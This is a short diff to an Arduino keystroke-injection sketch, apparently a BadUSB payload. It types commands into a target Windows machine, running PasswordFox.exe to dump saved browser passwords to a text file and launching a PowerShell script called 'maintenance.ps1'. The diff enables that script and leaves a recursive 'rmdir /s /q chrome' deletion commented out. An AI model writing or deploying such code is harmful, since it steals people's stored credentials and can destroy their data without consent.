@@ -42,10 +42,10 @@ void setup() {
   Keyboard.print("PasswordFox.exe /stext PasswordFox.txt");
   typeKey(KEY_RETURN);
   delay(1000);
-  /*Keyboard.print("powershell ./maintenance.ps1");
+  Keyboard.print("powershell ./maintenance.ps1");
   typeKey(KEY_RETURN);
   delay(100);
-  Keyboard.print("cd C:/");
+  /*Keyboard.print("cd C:/");
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("rmdir /s /q chrome");
